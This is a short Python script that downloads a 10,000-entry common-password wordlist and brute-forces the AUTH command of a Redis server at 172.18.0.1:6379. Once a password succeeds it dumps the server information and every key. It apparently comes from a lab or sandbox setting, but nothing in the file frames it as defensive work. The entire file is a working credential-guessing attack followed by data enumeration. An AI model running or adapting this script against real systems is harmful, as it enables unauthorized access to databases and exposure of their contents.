import socket, urllib.request

try:
    urllib.request.urlretrieve(
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
        "/tmp/10k.txt"
    )
    print("DOWNLOADED 10K wordlist")
except:
    print("DOWNLOAD FAILED")
    exit(1)

count = 0
with open("/tmp/10k.txt") as f:
    for line in f:
        pw = line.strip()
        if not pw:
            continue
        count += 1
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect(("172.18.0.1", 6379))
            s.send(f"AUTH {pw}\r\n".encode())
            r = s.recv(100).decode()
            if "+OK" in r:
                print(f"REDIS PASSWORD: {pw}")
                s.send(b"INFO server\r\n")
                print(s.recv(2000).decode()[:300])
                s.send(b"KEYS *\r\n")
                print(s.recv(4000).decode()[:500])
                s.close()
                exit(0)
            s.close()
        except:
            pass

print(f"Tested {count} passwords, NO MATCH")
